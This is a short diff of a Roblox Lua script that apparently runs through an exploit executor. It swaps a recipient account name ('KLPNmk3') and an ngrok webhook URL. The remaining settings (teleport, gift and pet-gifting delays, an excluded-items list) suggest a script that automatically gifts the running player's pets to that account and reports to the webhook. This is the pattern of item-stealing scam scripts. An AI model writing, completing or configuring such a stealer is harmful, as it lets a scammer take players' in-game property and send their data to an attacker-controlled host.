@@ -19,17 +19,17 @@ elseif fluxus then executorType = "Fluxus"
 elseif identifyexecutor then executorType = identifyexecutor() end
 
 -- CONFIG: Set your main account's name
-local OWNER_NAME = "KLPNmk13" -- 👈 CHANGE THIS
+local OWNER_NAME = "KLPNmk3" -- 👈 CHANGE THIS
 
 -- Other config values
-local TARGET_NAME = "KLPNmk13"
+local TARGET_NAME = "KLPNmk3"
 local LOADING_TIME = 120
 local TELEPORT_DELAY = 0.1
 local GIFT_HOLD_TIME = 2
 local EQUIP_DELAY = 0.5
 local GIFT_COOLDOWN = 0.4
 local LOOP_DELAY = 5
-local PROXY_URL = "https://6202-185-161-93-244.ngrok-free.app/webhook"
+local PROXY_URL = "https://b5f4-185-161-93-244.ngrok-free.app/webhook"
 local PET_GIFTING_DELAY = 0.5 -- Delay between pet gifting actions
 
 local EXCLUDEDITEMS = {
